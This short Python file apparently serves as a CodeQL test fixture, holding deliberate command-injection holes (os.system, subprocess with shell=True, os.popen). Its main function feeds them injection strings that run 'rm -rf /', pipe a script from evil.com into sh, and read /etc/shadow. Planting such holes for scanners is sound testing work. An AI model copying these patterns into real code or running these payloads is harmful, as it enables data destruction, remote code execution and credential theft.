#!/usr/bin/env python3
"""
Command injection vulnerabilities for CodeQL testing
"""
import os
import subprocess

def vulnerable_system_call(filename):
    """Function with command injection via os.system"""
    
    # VULNERABILITY: User input directly in system command
    command = f"cat {filename}"
    os.system(command)  # SINK: Command execution with user input

def vulnerable_subprocess(directory):
    """Function with command injection via subprocess"""
    
    # VULNERABILITY: User input in subprocess call
    result = subprocess.run(f"ls -la {directory}", shell=True)  # SINK: Shell command with user input
    return result

def vulnerable_popen(log_file):
    """Function with command injection via os.popen"""
    
    # VULNERABILITY: User input in popen
    pipe = os.popen(f"tail -n 10 {log_file}")  # SINK: Command with user input
    output = pipe.read()
    pipe.close()
    return output

def main():
    # Test with malicious input
    malicious_filename = "/etc/passwd; rm -rf /"
    malicious_directory = "/tmp; curl evil.com/steal.sh | sh"
    malicious_log = "/var/log/app.log && cat /etc/shadow"
    
    vulnerable_system_call(malicious_filename)
    vulnerable_subprocess(malicious_directory)
    vulnerable_popen(malicious_log)

if __name__ == "__main__":
    main()
